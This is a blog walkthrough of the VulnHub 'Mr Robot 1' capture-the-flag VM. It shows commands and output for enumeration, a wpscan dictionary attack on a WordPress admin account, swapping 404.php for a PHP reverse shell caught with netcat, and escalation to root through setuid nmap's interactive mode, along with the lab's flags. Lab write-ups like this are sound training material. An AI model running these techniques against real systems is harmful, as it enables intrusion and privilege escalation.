---
title: Mr Robot 1 Walkthough
date: '2018-02-08 13:28:00 +0000'
author: dow-j
categories:
  - walkthroughs
published: true
---

* TOC
{:toc}
{: .markdown-toc}

This past week I completed the [Mr Robot 1 VM](https://www.vulnhub.com/entry/mr-robot-1,151/), based on the show. There isn't anything terribly difficult with this VM, but it is enjoyable nonetheless.

## 0. Enumeration

Starting things off with a quick nmap scan
```
nmap 192.168.56.0/24 -F
```

Which reveals the IP of our victim and tells us that it's a web server... 
```
Nmap scan report for 192.168.56.101
Host is up (0.0022s latency).
Not shown: 97 filtered ports
PORT    STATE  SERVICE
22/tcp  closed ssh
80/tcp  open   http
443/tcp open   https
MAC Address: 08:00:27:99:B9:0A (Oracle VirtualBox virtual NIC)
```

Let's see if we can find any other services running
```
nmap -sV 192.168.56.101
```

Unfortunately this doesn't tell us anything that we don't already know
```
Starting Nmap 7.60 ( https://nmap.org ) at 2018-02-04 11:23 EST
Nmap scan report for 192.168.56.101
Host is up (0.00052s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd
MAC Address: 08:00:27:99:B9:0A (Oracle VirtualBox virtual NIC)
```

With that out of the way lets start poking at the web server

## 1. Web server

If we browse to http://192.168.56.101/ we're greeted with really cool web app styled to look like a terminal with various commands for us to use.

![](/img/blog/2018-02-08-mr-robot-1-vulnhub/mr-robot-1-browser.png)

Nifty as it was, it didn't reveal anything useful so I did more enumeration using `uniscan`
```
root@kali:~# uniscan -u http://192.168.56.101/ -qweds
####################################
# Uniscan project                  #
# http://uniscan.sourceforge.net/  #
####################################
V. 6.3


Scan date: 6-2-2018 18:30:18
===================================================================================================
| Domain: http://192.168.56.101/
| Server: Apache
| IP: 192.168.56.101
===================================================================================================
|
| Directory check:
| [+] CODE: 200 URL: http://192.168.56.101/Image/
| [+] CODE: 200 URL: http://192.168.56.101/admin/
| [+] CODE: 200 URL: http://192.168.56.101/feed/
| [+] CODE: 200 URL: http://192.168.56.101/image/
| [+] CODE: 200 URL: http://192.168.56.101/login/
| [+] CODE: 200 URL: http://192.168.56.101/rss/
| [+] CODE: 200 URL: http://192.168.56.101/wp-admin/
| [+] CODE: 200 URL: http://192.168.56.101/wp-login/
===================================================================================================
|                                                                                                   
| File check:
| [+] CODE: 200 URL: http://192.168.56.101/admin/index.html
| [+] CODE: 200 URL: http://192.168.56.101/admin/index.php
| [+] CODE: 200 URL: http://192.168.56.101/favicon.ico
| [+] CODE: 200 URL: http://192.168.56.101/index.html
| [+] CODE: 200 URL: http://192.168.56.101/index.html%20
| [+] CODE: 200 URL: http://192.168.56.101/index.php
| [+] CODE: 200 URL: http://192.168.56.101/license.txt
| [+] CODE: 200 URL: http://192.168.56.101/readme
| [+] CODE: 200 URL: http://192.168.56.101/readme.html
| [+] CODE: 200 URL: http://192.168.56.101/robots.txt
| [+] CODE: 200 URL: http://192.168.56.101/search/htx/SQLQHit.asp
| [+] CODE: 200 URL: http://192.168.56.101/search/sqlqhit.asp
| [+] CODE: 200 URL: http://192.168.56.101/search/htx/sqlqhit.asp
| [+] CODE: 200 URL: http://192.168.56.101/search/SQLQHit.asp
| [+] CODE: 200 URL: http://192.168.56.101/sitemap.xml
```

...and found the first flag via the `robots.txt` file
```
root@kali:~# curl http://192.168.56.101/robots.txt
User-agent: *
fsocity.dic
key-1-of-3.txt

root@kali:~# curl http://192.168.56.101/key-1-of-3.txt
073403c8a58a1f80d943455fb30724b9
```

<div class="note warning">
<p>robots.txt exists to tell spiders not to crawl the files and directories listed inside of it. 
As such it should <em>NEVER</em> be used as a form of access control. If you have sensitive
files on your web server that you don't want unauthorized people to access, then the web server
should be configured to do authentication.</p>
</div>

`robots.txt` also refers to `fsocity.dic` which appears to be a wordlist. Taking a look at it we see
that it is over 800k lines long. Let's see if we can clean it up a bit by sorting it and removing duplicates.
```
root@kali:~# wc -l fsocity.dic 
858160 fsocity.dic
root@kali:~# cat fsocity.dic | sort | uniq > fsocity_sorted.dic
root@kali:~# wc -l fsocity_sorted.dic 
11451 fsocity_sorted.dic
```

Over a 98% reduction! Now let's see how we can put it to use.

Our `uniscan` enumeration earlier revealed that this is a WordPress site since we see paths present like `/wp-login/` and `/wp-admin/`. We can use `wpscan` to further enumerate.
```
root@kali:~# wpscan --url http://192.168.56.101/ --enumerate u
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team 
                       Version 2.9.3
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o [A]bort, default: [N]
[+] URL: http://192.168.56.101/
[+] Started: Thu Feb  8 20:34:28 2018

[+] robots.txt available under: 'http://192.168.56.101/robots.txt'
[+] Interesting header: SERVER: Apache
[+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN
[+] Interesting header: X-MOD-PAGESPEED: 1.9.32.3-4523
[+] XML-RPC Interface available under: http://192.168.56.101/xmlrpc.php

[+] WordPress version 4.3.1 (Released on 2015-09-15) identified from advanced fingerprinting, rss generator, rdf generator, atom generator, links opml
[!] 45 vulnerabilities identified from the version number

[+] Enumerating plugins from passive detection ...
[+] No plugins found

[+] Enumerating usernames ...
[+] We did not enumerate any usernames

[+] Finished: Thu Feb  8 20:34:29 2018
[+] Requests Done: 62
[+] Memory used: 26.859 MB
[+] Elapsed time: 00:00:01
```

Unfortunately, that scan didn't find any users for us to attempt to brute force with our wordlist. So I did some more 
research and found out WordPress will actually give us a fairly unique error message if we attempt to login with
an existing user vs a non-existant user.
```
ERROR: Invalid username. [Lost your password?](http://192.168.56.101/wp-login.php?action=lostpassword)
```

Now my plan at this point was to write a python script that attempt to brute force some common usernames, and by presence of the above error message in the response body determine whether or not they are in use on this WordPress site.

However, since this is a Mr Robot vm. I figured I would try and login as some characters from the show.

Lo and behold...

![](/img/blog/2018-02-08-mr-robot-1-vulnhub/mr-robot-1-elliot-wp-login.png)

It looks like we have our user `elliot`. Let's use our `fsocity_sorted.dic` and attempt a dictionary attack
```
root@kali:~# wpscan --url http://192.168.56.101 --wordlist=/root/fsocity_sorted.dic --username elliot --threads 20
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team 
                       Version 2.9.3
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o [A]bort, default: [N]n
[+] URL: http://192.168.56.101/
[+] Started: Fri Feb  9 01:20:19 2018

[+] robots.txt available under: 'http://192.168.56.101/robots.txt'
[+] Interesting header: SERVER: Apache
[+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN
[+] Interesting header: X-MOD-PAGESPEED: 1.9.32.3-4523
[+] XML-RPC Interface available under: http://192.168.56.101/xmlrpc.php

[+] WordPress version 4.3.1 (Released on 2015-09-15) identified from advanced fingerprinting, rss generator, rdf generator, atom generator, links opml
[!] 45 vulnerabilities identified from the version number

[+] Enumerating plugins from passive detection ...
[+] No plugins found
[+] Starting the password brute forcer
  [+] [SUCCESS] Login : elliot Password : ER28-0652                                                                                                           

  Brute Forcing 'elliot' Time: 00:01:59 <======================================                                         > (5640 / 11452) 49.24%  ETA: 00:02:03
  +----+--------+------+-----------+
  | Id | Login  | Name | Password  |
  +----+--------+------+-----------+
  |    | elliot |      | ER28-0652 |
  +----+--------+------+-----------+

[+] Finished: Fri Feb  9 01:22:19 2018
[+] Requests Done: 5697
[+] Memory used: 52.477 MB
[+] Elapsed time: 00:02:00
```

We have found the password, and it's `ER28-0652`. Even better our friend `elliot` is a WordPress admin.

## 2. Getting a Shell
Since `elliot` is a WordPress admin we should be able to modify the `404.php` page to give us a [reverse shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell). This can be done by going to `Appearance` > `Editor` and replace the contents of `404.php` with the modified reverse shell.

<div class="note info">
<p>Make sure you change the IP and PORT in the php file</p>
</div>

Save your changes and setup a listener using `netcat` on the port specifed. Once a request is made to a non-existant page our reverse shell should be open.

```
root@kali:~# nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.101] 40502
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 21:52:04 up  1:46,  0 users,  load average: 0.00, 0.06, 0.50
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
daemon
$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
$ python -c 'import pty; pty.spawn("/bin/bash")'
daemon@linux:/$ 
```

Doing some further enumeration on the web server
```
daemon@linux:~$ cd /home
cd /home
daemon@linux:/home$ ls
ls
robot
daemon@linux:/home$ pwd
pwd
/home
daemon@linux:/home$ clear
clear
TERM environment variable not set.
daemon@linux:/home$ cd /
cd /
daemon@linux:/$ cd /home	
cd /home
daemon@linux:/home$ ls
ls
robot
daemon@linux:/home$ cd robot	
cd robot
daemon@linux:/home/robot$ ls -l
ls -l
total 8
-r-------- 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot 39 Nov 13  2015 password.raw-md5
daemon@linux:/home/robot$ cat password.raw-md5	
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
daemon@linux:/home/robot$ 
```

Doing a quick search reveals that this hash represents the string `abcdefghijklmnopqrstuvwxyz`
```
daemon@linux:/home/robot$ su robot 
su robot 
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:~$ ls
ls
key-2-of-3.txt	password.raw-md5
robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
robot@linux:~$ 
```

Woo! We've got our second flag `822c73956184f694993bede3eb39f959` One more to go.

## 3. Privilege Escalation

Let's do a search for setuid binaries and see what we can find
```
robot@linux:~$ find / -user root -perm -4000 2>/dev/null
find / -user root -perm -4000 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```

nmap doesn't normally have a setuid bit and this makes it vulnerable to privilege escalation.
```
robot@linux:/$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !whoami
!whoami
root
waiting to reap child : No child processes
nmap> !bash -p
!bash -p
bash-4.3# whoami
whoami
root
bash-4.3# id  
id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
bash-4.3# cd /root
cd /root
bash-4.3# ls -l
ls -l
total 4
-rw-r--r-- 1 root root  0 Nov 13  2015 firstboot_done
-r-------- 1 root root 33 Nov 13  2015 key-3-of-3.txt
bash-4.3# cat key-3-of-3.txt
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
bash-4.3# 
```

And there we have it the final flag `04787ddef27c3dee1ee161b21670b4e4`.
Thanks for reading!
